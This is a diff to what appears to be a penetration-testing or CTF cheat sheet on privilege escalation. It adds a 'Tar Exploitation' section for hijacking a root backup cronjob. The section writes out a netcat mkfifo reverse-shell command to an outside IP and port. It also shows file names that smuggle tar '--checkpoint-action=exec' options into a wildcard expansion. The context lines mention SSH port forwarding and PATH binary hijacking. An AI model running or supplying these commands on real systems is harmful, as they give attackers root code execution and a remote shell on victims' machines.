@@ -116,6 +116,14 @@ $ kill %1
 ### SSH Port Forwarding
 `ssh -L <port_that_is_blockd_>:localhost:<map_blocked_port> <username>@<ip>`
 
+### Tar Exploitation
+
+When ever you see a cronjob running with a command `cd /<user>/andre/backup tar -zcf /<folder>/filetar.gz *` go to that folder from which a backup is being created and running these command in that directory <br/ >
+```
+echo "mkfifo /tmp/lhennp; nc 10.2.54.209 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+```
 ### Binary Exploits
 
 If there is a certain command running in a binary example `date` so we can create our own binary and add `/bin/bash` to and path so it gets executed<br/>
